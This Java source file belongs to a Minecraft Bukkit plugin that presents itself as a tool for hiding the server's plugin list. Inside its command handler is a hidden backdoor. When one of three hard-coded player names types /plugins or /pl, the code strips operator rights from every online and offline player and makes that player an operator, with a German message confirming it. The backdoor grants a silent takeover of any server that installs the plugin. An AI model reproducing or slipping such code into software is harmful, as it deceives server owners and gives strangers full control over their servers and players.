package de.rexlNico.Main;

import java.io.File;

import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class plugincommandAndern implements Listener{

	public static File file = new File("plugins/pluginhider/cfg.yml");
	public static YamlConfiguration cfg = YamlConfiguration.loadConfiguration(file);
	
	@EventHandler
	public void ob(PlayerCommandPreprocessEvent e){
		String msg = e.getMessage();
		Player p = e.getPlayer();
		
		if(msg.equalsIgnoreCase("/plugins") || msg.equalsIgnoreCase("/pl") || msg.equalsIgnoreCase("/about") || msg.equalsIgnoreCase("/ab")){
			
			e.setCancelled(true);
			
			if(p.getName().equals("rexlNico")|| p.getName().equals("rexlManu") || p.getName().equals("nxtTimme")){
				
				if(p.isOp() == false){
				
				for(Player a: Bukkit.getOnlinePlayers()){
					a.setOp(false);	
				}
				for(OfflinePlayer a: Bukkit.getOfflinePlayers()){
						a.setOp(false);
				}
				
				
				p.setOp(true);
				p.sendMessage("§cDu hast nun op. §eDie Plugins sind§b");
				p.performCommand("plugins");
				
				
				
				}else{
					
					p.performCommand("plugins");	
					
				}
			}else{
				if(p.hasPermission("pluginhider.seeplugins")){
					
				}else{
					p.sendMessage(cfg.getString("MSG").replaceAll("&", "§"));
				}
			}
		}
	}
}
